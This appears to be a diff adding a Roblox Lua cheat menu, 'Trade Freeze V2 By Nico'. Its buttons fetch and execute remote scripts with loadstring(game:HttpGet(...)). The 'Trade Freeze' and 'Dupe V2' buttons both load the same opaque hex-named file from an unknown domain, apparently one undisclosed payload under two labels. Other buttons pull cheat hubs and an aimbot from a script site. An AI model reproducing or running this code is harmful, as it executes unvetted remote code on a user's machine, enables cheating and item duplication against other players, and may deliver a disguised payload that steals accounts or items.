@@ -1,0 +1,65 @@
+local Library = loadstring(game:HttpGet('https://raw.githubusercontent.com/Rain-Design/Unnamed/main/Library.lua'))()
+Library.Theme = "Dark"
+local Flags = Library.Flags
+
+local Window = Library:Window({
+   Text = "Trade Freeze V2 By Nico"
+})
+
+-- First Tab
+local Tab1 = Window:Tab({
+   Text = "Main"
+})
+
+local Section1 = Tab1:Section({
+   Text = "Menu"
+})
+
+-- Buttons in the first section
+Section1:Button({
+   Text = "Trade Freeze",
+   Callback = function()loadstring(game:HttpGet("https://egorikusa.space/4aa7aa90ee1321295a2bbb00.lua", true))()
+       warn("Trade Freeze")
+   end
+})
+
+Section1:Button({
+   Text = "Dupe V2",
+   Callback = function()loadstring(game:HttpGet("https://egorikusa.space/4aa7aa90ee1321295a2bbb00.lua", true))()
+       warn("Dupe V2")
+   end
+})
+
+Section1:Button({
+   Text = "CamLockM2",
+   Callback = function()loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-da-hood-15810"))()
+       warn("CamLockM2")
+   end
+})
+
+-- Second Tab
+local Tab2 = Window:Tab({
+   Text = "Advanced"
+})
+
+local Section2 = Tab2:Section({
+   Text = "HUB UI"  -- Changed section name to HUB UI
+})
+
+-- Renamed Option 1 to Yarhm Gui
+Section2:Button({
+   Text = "Yarhm Gui",
+   Callback = function()loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-YARHM-12403"))()
+       warn("Yarhm Gui Selected")
+   end
+})
+
+-- Renamed Option 2 to Ghost Hub Gui
+Section2:Button({
+   Text = "Ghost Hub Gui",
+   Callback = function()loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Ghost-hub-16101"))()
+       warn("Ghost Hub Gui Selected")
+   end
+})
+
+Tab1:Select()  -- This will select the first tab by default
